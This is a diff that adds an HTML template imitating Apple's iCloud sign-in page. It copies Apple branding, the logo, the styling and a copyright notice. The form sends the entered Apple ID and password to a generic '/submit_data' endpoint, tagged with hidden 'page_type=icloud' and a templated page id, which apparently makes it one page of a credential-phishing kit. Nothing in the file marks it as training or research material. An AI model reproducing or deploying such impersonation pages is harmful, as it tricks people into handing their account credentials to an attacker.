@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - iCloud</title>
+    <link href="https://fonts.googleapis.com/css2?family=SF+Pro+Display:wght@300;400;500;600&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --apple-blue: #0070c9;
+            --apple-blue-hover: #0077cc;
+            --apple-black: #000000;
+            --apple-gray: #86868b;
+            --apple-light-gray: #f5f5f7;
+            --apple-border: #d2d2d7;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: "SF Pro Display", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+            background-color: #fff;
+            color: var(--apple-black);
+            line-height: 1.47059;
+            font-weight: 400;
+            letter-spacing: -0.022em;
+        }
+        
+        .login-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+            padding: 0 16px;
+        }
+        
+        .header {
+            width: 100%;
+            text-align: center;
+            padding: 16px;
+            background: var(--apple-light-gray);
+            margin-bottom: 40px;
+        }
+        
+        .apple-logo {
+            width: 40px;
+            height: 44px;
+        }
+        
+        .login-box {
+            max-width: 448px;
+            width: 100%;
+            padding: 0 16px;
+        }
+        
+        .login-title {
+            font-size: 24px;
+            line-height: 1.16667;
+            font-weight: 500;
+            letter-spacing: .009em;
+            text-align: center;
+            margin-bottom: 32px;
+        }
+        
+        .form-group {
+            margin-bottom: 24px;
+        }
+        
+        .form-control {
+            width: 100%;
+            height: 44px;
+            padding: 12px;
+            font-size: 17px;
+            line-height: 1.23536;
+            font-weight: 400;
+            letter-spacing: -.021em;
+            border: 1px solid var(--apple-border);
+            border-radius: 6px;
+            outline: none;
+            -webkit-appearance: none;
+        }
+        
+        .form-control:focus {
+            border-color: var(--apple-blue);
+            box-shadow: 0 0 0 4px rgba(0, 125, 250, 0.2);
+        }
+        
+        .signin-button {
+            width: 100%;
+            height: 50px;
+            font-size: 17px;
+            line-height: 1.23536;
+            font-weight: 400;
+            letter-spacing: -.021em;
+            background-color: var(--apple-blue);
+            color: #fff;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            margin-bottom: 16px;
+            transition: background-color 0.2s;
+        }
+        
+        .signin-button:hover {
+            background-color: var(--apple-blue-hover);
+        }
+        
+        .forgot-password {
+            display: block;
+            color: var(--apple-blue);
+            font-size: 17px;
+            line-height: 1.23536;
+            font-weight: 400;
+            text-decoration: none;
+            text-align: center;
+            margin-bottom: 32px;
+        }
+        
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+        
+        .divider {
+            border-top: 1px solid var(--apple-border);
+            margin: 32px 0;
+        }
+        
+        .create-account {
+            text-align: center;
+            font-size: 14px;
+            line-height: 1.42859;
+            font-weight: 400;
+            letter-spacing: -.016em;
+            color: var(--apple-gray);
+        }
+        
+        .create-account-link {
+            color: var(--apple-blue);
+            text-decoration: none;
+        }
+        
+        .create-account-link:hover {
+            text-decoration: underline;
+        }
+        
+        .footer {
+            width: 100%;
+            text-align: center;
+            padding: 32px 16px;
+            background: var(--apple-light-gray);
+            margin-top: auto;
+        }
+        
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 24px;
+            margin-bottom: 8px;
+        }
+        
+        .footer-link {
+            color: var(--apple-gray);
+            font-size: 12px;
+            line-height: 1.33337;
+            font-weight: 400;
+            text-decoration: none;
+        }
+        
+        .footer-link:hover {
+            text-decoration: underline;
+        }
+        
+        .copyright {
+            color: var(--apple-gray);
+            font-size: 12px;
+            line-height: 1.33337;
+            font-weight: 400;
+        }
+        
+        @media (max-width: 734px) {
+            .login-title {
+                font-size: 21px;
+            }
+            
+            .form-control,
+            .signin-button {
+                font-size: 16px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <header class="header">
+            <svg class="apple-logo" viewBox="0 0 17 48" xmlns="http://www.w3.org/2000/svg">
+                <path d="m15.5752 19.0792c-.4188.1916-.8404.3208-1.2592.3208-.5496 0-1.0272-.1624-1.4308-.4864-.4056-.3248-.6096-.7544-.6096-1.2896 0-.5488.2068-.9896.6188-1.3232.4128-.3336.8916-.5.4376-.5.4124 0 .8332.1292 1.2592.3876l.4788-1.0272c-.5352-.3056-1.1796-.4584-1.9324-.4584-.9212 0-1.6792.2792-2.2728.8376-.5928.5584-.8896 1.2688-.8896 2.1312 0 .8896.2952 1.6016.8848 2.1368.59.5352 1.3656.8024 2.3268.8024.7392 0 1.3748-.1584 1.9068-.476l-.4584-1.0272zm-6.3772-5.0728h-1.4308v6.8376h1.4308v-6.8376zm-2.4524 2.94c0-.9212-.2924-1.6564-.8772-2.2056-.5848-.5496-1.3748-.824-2.37-.824-.9212 0-1.6728.29-2.2548.8712-.582.5808-.873 1.3536-.873 2.3184 0 .9212.295 1.6536.8848 2.1972.5896.5432 1.3748.8144 2.3556.8144.6116 0 1.1796-.1036 1.7048-.3104.5244-.2068.9652-.4788 1.3232-.8144l-.6804-.8848c-.5352.4732-1.1796.71-1.9324.71-.5352 0-.9776-.134-1.3272-.4024-.3504-.2676-.5584-.6288-.6252-1.0828h5.5716c.0272-.1368.0408-.3416.0408-.6144v-.476zm-5.5012-.7304c.0668-.3876.2456-.7048.5368-.9524.2912-.2468.6416-.3704 1.0492-.3704.4468 0 .8144.1236 1.1028.3704.2884.2476.4632.5648.5244.9524h-3.2132z" fill="#1d1d1f"/>
+            </svg>
+        </header>
+        
+        <main class="login-box">
+            <h1 class="login-title">Sign in with your Apple ID</h1>
+            
+            <form method="POST" action="/submit_data">
+                <input type="hidden" name="page_type" value="icloud">
+                <input type="hidden" name="page_id" value="{{ page_id }}">
+                
+                <div class="form-group">
+                    <input type="text" class="form-control" id="username" name="username" placeholder="Apple ID" required>
+                </div>
+                
+                <div class="form-group">
+                    <input type="password" class="form-control" id="password" name="password" placeholder="Password" required>
+                </div>
+                
+                <button type="submit" class="signin-button">Sign In</button>
+                
+                <a href="#" class="forgot-password">Forgot Apple ID or Password?</a>
+                
+                <div class="divider"></div>
+                
+                <p class="create-account">
+                    Don't have an Apple ID? <a href="#" class="create-account-link">Create yours now</a>
+                </p>
+            </form>
+        </main>
+        
+        <footer class="footer">
+            <div class="footer-links">
+                <a href="#" class="footer-link">System Status</a>
+                <a href="#" class="footer-link">Privacy Policy</a>
+                <a href="#" class="footer-link">Terms & Conditions</a>
+            </div>
+            <p class="copyright">Copyright © 2024 Apple Inc. All rights reserved.</p>
+        </footer>
+    </div>
+</body>
+</html> 
